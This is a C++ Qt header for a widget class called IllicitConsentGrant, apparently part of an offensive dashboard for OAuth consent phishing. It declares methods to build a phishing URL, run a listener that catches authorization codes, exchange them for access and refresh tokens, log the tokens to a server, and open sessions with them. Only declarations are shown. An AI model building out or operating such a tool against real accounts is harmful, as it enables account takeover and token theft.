#pragma once
#include <QWidget>
#include <QVBoxLayout>
#include <QLineEdit>
#include <QTextEdit>
#include <QLabel>
#include <QPushButton>
#include <QCheckBox>
#include <QMessageBox>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QUrlQuery>
#include <QJsonDocument>
#include <QJsonObject>
#include <QUuid>
#include <QTcpServer>
#include <QTcpSocket>
#include <QRegularExpression>
#include <QSpinBox>

class DashboardWindow;

class IllicitConsentGrant : public QWidget {
    Q_OBJECT
public:
    explicit IllicitConsentGrant(DashboardWindow *dashboard = nullptr, QWidget *parent = nullptr);
    ~IllicitConsentGrant();

private slots:
    void handleStart();
    void exchangeCodeForToken(const QString &code);

private:
    QString buildPhishingUrl();
    void startHttpServer();
    void logTokenToServer(const QString &accessToken, const QString &refreshToken, const QString &scope);
    void createSessionFromToken(const QString &accessToken, const QString &refreshToken, const QString &resource);
    void wireTransport();
    QObject* locateTransport() const;

    // UI
    DashboardWindow *parentDashboard;
    QLineEdit *clientIdInput;
    QLineEdit *clientSecretInput;
    QLineEdit *redirectInput;
    QTextEdit *scopeInput;
    QPushButton *generateBtn;
    QCheckBox *createSessionCheckbox;
    QTextEdit *urlBox;
    QTextEdit *tokenOutput;
    QSpinBox *portSpinBox;

    // State
    QString clientId;
    QString clientSecret;
    QString redirectBase;
    QString redirectUri;
    QString scopes;

    // Pending session creation state
    QString pendingRid;
    QString pendingAccessToken;
    QString pendingRefreshToken;
    QString pendingResource;
    bool hookConnected = false;
    bool sessionHandled = false;

    // Helpers
    QTcpServer *tcpServer;
    QNetworkAccessManager *netManager;
};
